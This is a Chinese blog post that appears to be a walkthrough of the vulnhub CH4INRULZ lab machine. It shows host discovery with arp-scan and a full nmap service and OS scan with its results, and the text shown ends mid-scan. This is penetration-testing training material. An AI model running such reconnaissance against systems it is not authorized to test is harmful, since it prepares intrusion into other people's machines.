<!-- build time:Tue Mar 01 2022 19:06:24 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="未入江湖，怎敢佩刀" href="https://www.21r000.xyz/rss.xml"><link rel="alternate" type="application/atom+xml" title="未入江湖，怎敢佩刀" href="https://www.21r000.xyz/atom.xml"><link rel="alternate" type="application/json" title="未入江湖，怎敢佩刀" href="https://www.21r000.xyz/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="vulnhub靶机实战"><link rel="canonical" href="https://www.21r000.xyz/article/3f0418ee.html"><title>vulnhub靶场实战-CH4INRULZ_v1.0.1 - vulnhub靶机实战 | 21r000 = 未入江湖，怎敢佩刀 = 你的骑士还没有来，你就永远是我的公主。</title><meta name="generator" content="Hexo 6.0.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">vulnhub靶场实战-CH4INRULZ_v1.0.1</h1><div class="meta"><span class="item" title="创建时间：2021-12-18 12:14:36"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2021-12-18T12:14:36+08:00">2021-12-18</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>17k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>16 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">21r000</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://gitee.com/Is21r000/image/raw/master/picgo/6833939bly1gipexj2jgzj20zk0m8b09.jpg"></li><li class="item" data-background-image="https://gitee.com/Is21r000/image/raw/master/picgo/6833939bly1gicmnywqgpj20zk0m8dwx.jpg"></li><li class="item" data-background-image="https://gitee.com/Is21r000/image/raw/master/picgo/6833939bly1gipexw3o58j20zk0m8e81.jpg"></li><li class="item" data-background-image="https://gitee.com/Is21r000/image/raw/master/picgo/6833939bly1giclil3m4ej20zk0m8tn8.jpg"></li><li class="item" data-background-image="https://gitee.com/Is21r000/image/raw/master/picgo/6833939bly1gipeyhsblkj20zk0m81kx.jpg"></li><li class="item" data-background-image="https://gitee.com/Is21r000/image/raw/master/picgo/6833939bly1gicit31ffoj20zk0m8naf.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/vulnhub%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98/" itemprop="item" rel="index" title="分类于 vulnhub靶机实战"><span itemprop="name">vulnhub靶机实战</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.21r000.xyz/article/3f0418ee.html"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="21r000"><meta itemprop="description" content="你的骑士还没有来，你就永远是我的公主。, 固态规则长方体空间移动工程师"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="未入江湖，怎敢佩刀"></span><div class="body md" itemprop="articleBody"><h2 id="前言"><a class="anchor" href="#前言">#</a> 前言</h2><p>靶机下载地址:</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span>entry<span class="token operator">/</span>ch4inrulz<span class="token operator">-</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">247</span><span class="token operator">/</span></pre></td></tr></table></figure><p>靶机说明：</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Frank has a small website and he is a smart developer <span class="token keyword">with</span> a normal security background <span class="token punctuation">,</span> he always love to follow patterns <span class="token punctuation">,</span> your goal is to discover any critical vulnerabilities and gain access to the system <span class="token punctuation">,</span> then you need to gain root access <span class="token keyword">in</span> order to capture the root flag<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>This machine was made <span class="token keyword">for</span> Jordan’s Top hacker <span class="token number">2018</span> <span class="token constant">CTF</span> <span class="token punctuation">,</span> we tried to make it simulate a real world attacks <span class="token keyword">in</span> order to improve your penetration testing skills<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>The machine was tested on <span class="token function">vmware</span> <span class="token punctuation">(</span>player <span class="token operator">/</span> workstation<span class="token punctuation">)</span> and works without any problems <span class="token punctuation">,</span> so we recommend to use VMware to run it <span class="token punctuation">,</span> Also works fine using virtualbox<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token literal-property property">Difficulty</span><span class="token operator">:</span> Intermediate <span class="token punctuation">,</span> you need to think out <span class="token keyword">of</span> the box and collect all the puzzle pieces <span class="token keyword">in</span> order to <span class="token keyword">get</span> the job done<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>The machine is already got <span class="token constant">DHCP</span> enabled <span class="token punctuation">,</span> so you will not have any problems <span class="token keyword">with</span> networking<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>Happy Hacking <span class="token operator">!</span></pre></td></tr></table></figure><h2 id="环境配置"><a class="anchor" href="#环境配置">#</a> 环境配置</h2><p>这里使用 <code>VM workstation</code> 和 <code>VM VirtualBox</code> 进行演练</p><p>为了正常练习，将靶场的网卡模式设置为桥接模式，启动即可</p><h2 id="主机发现"><a class="anchor" href="#主机发现">#</a> 主机发现</h2><p>查看本机 IP：</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>root@kali<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop# ifconfig</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token literal-property property">docker0</span><span class="token operator">:</span> flags<span class="token operator">=</span><span class="token number">4099</span><span class="token operator">&lt;</span><span class="token constant">UP</span><span class="token punctuation">,</span><span class="token constant">BROADCAST</span><span class="token punctuation">,</span><span class="token constant">MULTICAST</span><span class="token operator">></span>  mtu <span class="token number">1500</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        inet <span class="token number">172.17</span><span class="token number">.0</span><span class="token number">.1</span>  netmask <span class="token number">255.255</span><span class="token number">.0</span><span class="token number">.0</span>  broadcast <span class="token number">172.17</span><span class="token number">.255</span><span class="token number">.255</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        ether <span class="token number">02</span><span class="token operator">:</span><span class="token number">42</span><span class="token operator">:</span>8e<span class="token operator">:</span><span class="token number">77</span><span class="token operator">:</span><span class="token number">02</span><span class="token operator">:</span><span class="token number">02</span>  txqueuelen <span class="token number">0</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token constant">RX</span> packets <span class="token number">0</span>  bytes <span class="token number">0</span> <span class="token punctuation">(</span><span class="token number">0.0</span> <span class="token constant">B</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token constant">RX</span> errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token constant">TX</span> packets <span class="token number">0</span>  bytes <span class="token number">0</span> <span class="token punctuation">(</span><span class="token number">0.0</span> <span class="token constant">B</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token constant">TX</span> errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token literal-property property">eth0</span><span class="token operator">:</span> flags<span class="token operator">=</span><span class="token number">4163</span><span class="token operator">&lt;</span><span class="token constant">UP</span><span class="token punctuation">,</span><span class="token constant">BROADCAST</span><span class="token punctuation">,</span><span class="token constant">RUNNING</span><span class="token punctuation">,</span><span class="token constant">MULTICAST</span><span class="token operator">></span>  mtu <span class="token number">1500</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        inet <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.115</span>  netmask <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span>  broadcast <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.255</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        inet6 fe80<span class="token operator">:</span><span class="token operator">:</span>20c<span class="token operator">:</span>29ff<span class="token operator">:</span>fedc<span class="token operator">:</span><span class="token number">3789</span>  prefixlen <span class="token number">64</span>  scopeid <span class="token number">0x20</span><span class="token operator">&lt;</span>link<span class="token operator">></span></pre></td></tr><tr><td data-num="13"></td><td><pre>        ether <span class="token number">00</span><span class="token operator">:</span>0c<span class="token operator">:</span><span class="token number">29</span><span class="token operator">:</span>dc<span class="token operator">:</span><span class="token number">37</span><span class="token operator">:</span><span class="token number">89</span>  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token constant">RX</span> packets <span class="token number">23392</span>  bytes <span class="token number">23815386</span> <span class="token punctuation">(</span><span class="token number">22.7</span> MiB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token constant">RX</span> errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token constant">TX</span> packets <span class="token number">11929</span>  bytes <span class="token number">2517903</span> <span class="token punctuation">(</span><span class="token number">2.4</span> MiB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token constant">TX</span> errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token literal-property property">lo</span><span class="token operator">:</span> flags<span class="token operator">=</span><span class="token number">73</span><span class="token operator">&lt;</span><span class="token constant">UP</span><span class="token punctuation">,</span><span class="token constant">LOOPBACK</span><span class="token punctuation">,</span><span class="token constant">RUNNING</span><span class="token operator">></span>  mtu <span class="token number">65536</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        inet <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>  netmask <span class="token number">255.0</span><span class="token number">.0</span><span class="token number">.0</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token literal-property property">inet6</span> <span class="token operator">:</span><span class="token operator">:</span><span class="token number">1</span>  prefixlen <span class="token number">128</span>  scopeid <span class="token number">0x10</span><span class="token operator">&lt;</span>host<span class="token operator">></span></pre></td></tr><tr><td data-num="22"></td><td><pre>        loop  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Local Loopback<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token constant">RX</span> packets <span class="token number">452</span>  bytes <span class="token number">37339</span> <span class="token punctuation">(</span><span class="token number">36.4</span> KiB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token constant">RX</span> errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token constant">TX</span> packets <span class="token number">452</span>  bytes <span class="token number">37339</span> <span class="token punctuation">(</span><span class="token number">36.4</span> KiB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token constant">TX</span> errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span></pre></td></tr></table></figure><p>使用 <code>arp命令</code> 扫描本地靶机</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>arp<span class="token operator">-</span>scan <span class="token operator">-</span>l</pre></td></tr></table></figure><p>我们可以得到：</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">Interface</span><span class="token operator">:</span> eth0<span class="token punctuation">,</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token constant">EN10MB</span><span class="token punctuation">,</span> <span class="token constant">MAC</span><span class="token operator">:</span> <span class="token number">00</span><span class="token operator">:</span>0c<span class="token operator">:</span><span class="token number">29</span><span class="token operator">:</span>dc<span class="token operator">:</span><span class="token number">37</span><span class="token operator">:</span><span class="token number">89</span><span class="token punctuation">,</span> <span class="token literal-property property">IPv4</span><span class="token operator">:</span> <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.115</span></pre></td></tr><tr><td data-num="2"></td><td><pre>Starting arp<span class="token operator">-</span>scan <span class="token number">1.9</span><span class="token number">.7</span> <span class="token keyword">with</span> <span class="token number">256</span> <span class="token function">hosts</span> <span class="token punctuation">(</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>royhills<span class="token operator">/</span>arp<span class="token operator">-</span>scan<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.1</span>    0a<span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">27</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">19</span>       <span class="token punctuation">(</span>Unknown<span class="token operator">:</span> locally administered<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.100</span>  <span class="token number">08</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">27</span><span class="token operator">:</span><span class="token number">49</span><span class="token operator">:</span><span class="token number">72</span><span class="token operator">:</span><span class="token number">02</span>       <span class="token constant">PCS</span> Systemtechnik GmbH</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span>  <span class="token number">08</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">27</span><span class="token operator">:</span>3f<span class="token operator">:</span>e0<span class="token operator">:</span>b0       <span class="token constant">PCS</span> Systemtechnik GmbH</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">3</span> packets received by filter<span class="token punctuation">,</span> <span class="token number">0</span> packets dropped by kernel</pre></td></tr><tr><td data-num="8"></td><td><pre>Ending arp<span class="token operator">-</span>scan <span class="token number">1.9</span><span class="token number">.7</span><span class="token operator">:</span> <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">2.009</span> <span class="token function">seconds</span> <span class="token punctuation">(</span><span class="token number">127.43</span> hosts<span class="token operator">/</span>sec<span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token number">3</span> responded</pre></td></tr></table></figure><p>从扫描得到的信息中，我们不难发现</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>目标机的ip为：<span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>本机的ip为：<span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.115</span></pre></td></tr></table></figure><p>如不确定哪个是目标机，那么为确定目标机 IP，可以登录 ip 就可以看到相关网页内容。</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180036380-592837012.png" alt="image"></p><h2 id="端口扫描"><a class="anchor" href="#端口扫描">#</a> 端口扫描</h2><p>使用 <code>nmap</code> 指令对目标机的端口进行扫描：</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">-</span>sV <span class="token operator">-</span><span class="token constant">A</span> <span class="token operator">-</span><span class="token constant">O</span> <span class="token operator">-</span><span class="token constant">T4</span> <span class="token operator">-</span>p1<span class="token operator">-</span><span class="token number">10000</span> <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180113516-2117323135.png" alt="image"></p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Starting Nmap <span class="token number">7.80</span> <span class="token punctuation">(</span> https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at <span class="token number">2021</span><span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">12</span> <span class="token number">04</span><span class="token operator">:</span><span class="token number">18</span> <span class="token constant">EST</span></pre></td></tr><tr><td data-num="2"></td><td><pre>Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span></pre></td></tr><tr><td data-num="3"></td><td><pre>Host is <span class="token function">up</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">.</span>00049s latency<span class="token punctuation">)</span><span class="token punctuation">.</span></pre></td></tr><tr><td data-num="4"></td><td><pre>Not shown<span class="token operator">:</span> <span class="token number">9996</span> closed ports</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token constant">PORT</span>     <span class="token constant">STATE</span> <span class="token constant">SERVICE</span> <span class="token constant">VERSION</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">21</span><span class="token operator">/</span>tcp   open  ftp     vsftpd <span class="token number">2.3</span><span class="token number">.5</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">|</span>_ftp<span class="token operator">-</span>anon<span class="token operator">:</span> Anonymous <span class="token constant">FTP</span> login <span class="token function">allowed</span> <span class="token punctuation">(</span><span class="token constant">FTP</span> code <span class="token number">230</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">|</span> ftp<span class="token operator">-</span>syst<span class="token operator">:</span> </pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">|</span>   <span class="token constant">STAT</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">|</span> <span class="token constant">FTP</span> server status<span class="token operator">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">|</span>      Connected to <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.115</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token operator">|</span>      Logged <span class="token keyword">in</span> <span class="token keyword">as</span> ftp</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token operator">|</span>      <span class="token constant">TYPE</span><span class="token operator">:</span> <span class="token constant">ASCII</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token operator">|</span>      No session bandwidth limit</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token operator">|</span>      Session timeout <span class="token keyword">in</span> seconds is <span class="token number">300</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token operator">|</span>      Control connection is plain text</pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token operator">|</span>      Data connections will be plain text</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token operator">|</span>      At session startup<span class="token punctuation">,</span> client count was <span class="token number">2</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token operator">|</span>      vsFTPd <span class="token number">2.3</span><span class="token number">.5</span> <span class="token operator">-</span> secure<span class="token punctuation">,</span> fast<span class="token punctuation">,</span> stable</pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token operator">|</span>_End <span class="token keyword">of</span> status</pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token number">22</span><span class="token operator">/</span>tcp   open  ssh     OpenSSH <span class="token number">5</span><span class="token punctuation">.</span>9p1 Debian 5ubuntu1<span class="token punctuation">.</span><span class="token number">10</span> <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token operator">|</span> ssh<span class="token operator">-</span>hostkey<span class="token operator">:</span> </pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token operator">|</span>   <span class="token number">1024</span> <span class="token literal-property property">d4</span><span class="token operator">:</span>f8<span class="token operator">:</span>c1<span class="token operator">:</span><span class="token number">55</span><span class="token operator">:</span><span class="token number">92</span><span class="token operator">:</span><span class="token number">75</span><span class="token operator">:</span><span class="token number">93</span><span class="token operator">:</span>f7<span class="token operator">:</span>7b<span class="token operator">:</span><span class="token number">65</span><span class="token operator">:</span>dd<span class="token operator">:</span>2b<span class="token operator">:</span><span class="token number">94</span><span class="token operator">:</span>e8<span class="token operator">:</span>bb<span class="token operator">:</span><span class="token number">47</span> <span class="token punctuation">(</span><span class="token constant">DSA</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token operator">|</span>   <span class="token number">2048</span> 3d<span class="token operator">:</span><span class="token number">24</span><span class="token operator">:</span>ea<span class="token operator">:</span>4f<span class="token operator">:</span>a2<span class="token operator">:</span>2a<span class="token operator">:</span>ca<span class="token operator">:</span><span class="token number">63</span><span class="token operator">:</span>b7<span class="token operator">:</span>f4<span class="token operator">:</span><span class="token number">27</span><span class="token operator">:</span>0f<span class="token operator">:</span>d9<span class="token operator">:</span><span class="token number">17</span><span class="token operator">:</span><span class="token number">03</span><span class="token operator">:</span><span class="token number">22</span> <span class="token punctuation">(</span><span class="token constant">RSA</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token operator">|</span>_  <span class="token number">256</span> <span class="token literal-property property">e2</span><span class="token operator">:</span><span class="token number">54</span><span class="token operator">:</span>a7<span class="token operator">:</span>c7<span class="token operator">:</span>ef<span class="token operator">:</span>aa<span class="token operator">:</span>8c<span class="token operator">:</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">61</span><span class="token operator">:</span><span class="token number">20</span><span class="token operator">:</span>bd<span class="token operator">:</span>aa<span class="token operator">:</span><span class="token number">72</span><span class="token operator">:</span>c0<span class="token operator">:</span><span class="token number">17</span><span class="token operator">:</span><span class="token number">88</span> <span class="token punctuation">(</span><span class="token constant">ECDSA</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token number">80</span><span class="token operator">/</span>tcp   open  http    Apache httpd <span class="token number">2.2</span><span class="token number">.22</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token operator">|</span>_http<span class="token operator">-</span>server<span class="token operator">-</span>header<span class="token operator">:</span> Apache<span class="token operator">/</span><span class="token number">2.2</span><span class="token number">.22</span> <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token operator">|</span>_http<span class="token operator">-</span>title<span class="token operator">:</span> <span class="token constant">FRANK</span>'s Website <span class="token operator">|</span> Under development</pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token number">8011</span><span class="token operator">/</span>tcp open  http    Apache httpd <span class="token number">2.2</span><span class="token number">.22</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token operator">|</span>_http<span class="token operator">-</span>server<span class="token operator">-</span>header<span class="token operator">:</span> Apache<span class="token operator">/</span><span class="token number">2.2</span><span class="token number">.22</span> <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token operator">|</span>_http<span class="token operator">-</span>title<span class="token operator">:</span> Site doesn't have a <span class="token function">title</span> <span class="token punctuation">(</span>text<span class="token operator">/</span>html<span class="token punctuation">)</span><span class="token punctuation">.</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token constant">MAC</span> <span class="token literal-property property">Address</span><span class="token operator">:</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">27</span><span class="token operator">:</span>3F<span class="token operator">:</span><span class="token constant">E0</span><span class="token operator">:</span><span class="token constant">B0</span> <span class="token punctuation">(</span>Oracle VirtualBox virtual <span class="token constant">NIC</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>Device type<span class="token operator">:</span> general purpose</pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token literal-property property">Running</span><span class="token operator">:</span> Linux <span class="token number">2.6</span><span class="token punctuation">.</span><span class="token constant">X</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token constant">OS</span> <span class="token constant">CPE</span><span class="token operator">:</span> cpe<span class="token operator">:</span><span class="token operator">/</span>o<span class="token operator">:</span>linux<span class="token operator">:</span>linux_kernel<span class="token operator">:</span><span class="token number">2.6</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token constant">OS</span> <span class="token literal-property property">details</span><span class="token operator">:</span> Linux <span class="token number">2.6</span><span class="token number">.19</span> <span class="token operator">-</span> <span class="token number">2.6</span><span class="token number">.36</span></pre></td></tr><tr><td data-num="37"></td><td><pre>Network Distance<span class="token operator">:</span> <span class="token number">1</span> hop</pre></td></tr><tr><td data-num="38"></td><td><pre>Service Info<span class="token operator">:</span> OSs<span class="token operator">:</span> Unix<span class="token punctuation">,</span> Linux<span class="token punctuation">;</span> <span class="token constant">CPE</span><span class="token operator">:</span> cpe<span class="token operator">:</span><span class="token operator">/</span>o<span class="token operator">:</span>linux<span class="token operator">:</span>linux_kernel</pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token constant">TRACEROUTE</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token constant">HOP</span> <span class="token constant">RTT</span>     <span class="token constant">ADDRESS</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token number">1</span>   <span class="token number">0.49</span> ms <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span></pre></td></tr><tr><td data-num="43"></td><td><pre></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token constant">OS</span> and Service detection performed<span class="token punctuation">.</span> Please report any incorrect results at https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org<span class="token operator">/</span>submit<span class="token operator">/</span> <span class="token punctuation">.</span></pre></td></tr><tr><td data-num="45"></td><td><pre>Nmap done<span class="token operator">:</span> <span class="token number">1</span> <span class="token constant">IP</span> <span class="token function">address</span> <span class="token punctuation">(</span><span class="token number">1</span> host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token 